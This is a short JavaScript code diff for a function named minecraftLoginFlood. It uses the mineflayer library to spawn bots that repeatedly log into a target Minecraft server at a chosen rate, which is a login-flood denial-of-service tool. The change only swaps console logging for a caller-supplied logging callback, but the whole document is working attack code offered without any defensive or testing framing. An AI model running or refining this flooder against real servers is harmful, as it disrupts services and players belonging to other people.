@@ -1,6 +1,6 @@
 const mineflayer = require('mineflayer');
 
-function minecraftLoginFlood(target, rateLimit) {
+function minecraftLoginFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         const bot = mineflayer.createBot({
             host: target,
@@ -9,12 +9,12 @@ function minecraftLoginFlood(target, rateLimit) {
         });
 
         bot.on('login', () => {
-            console.log('Bot logged in');
+            logOutput('Bot logged in');
             bot.end();
         });
 
         bot.on('error', (err) => {
-            console.error('Bot error: ' + err.message);
+            logOutput('Bot error: ' + err.message);
         });
     }, 1000 / rateLimit);
 }
